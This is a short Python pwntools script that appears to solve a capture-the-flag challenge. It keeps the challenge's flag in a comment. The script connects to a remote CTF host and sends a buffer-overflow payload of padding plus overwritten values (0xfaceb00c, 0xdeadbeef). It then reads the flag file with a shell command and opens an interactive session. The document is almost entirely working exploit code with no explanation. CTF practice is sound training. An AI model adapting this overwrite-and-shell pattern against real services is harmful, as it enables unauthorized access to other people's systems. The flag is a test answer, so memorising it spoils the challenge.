#!/usr/bin/env python
from pwn import *

# AD{Y0u_gue55_1t_w1th_luck_or_w1th_y0ur_skill_:D}

host , port = 'ctf.yuawn.idv.tw' , 10101
y = remote( host , port )

y.send( 'D' * 0xc + p32( 0xfaceb00c ) + p32( 0xdeadbeef ) + p32( 0x7 ) )

y.sendline( '7' )

sleep(1)

y.sendline( 'cat /home/`whoami`/flag' )

y.interactive()